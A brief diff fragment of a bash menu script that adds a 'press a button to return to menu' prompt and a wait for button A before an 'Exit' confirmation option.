+			LOG green "PRESS A BUTTON TO RETURN TO MENU"
+			WAIT_FOR_BUTTON_PRESS A
 		;;
 		"Exit")
 			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || exit 0
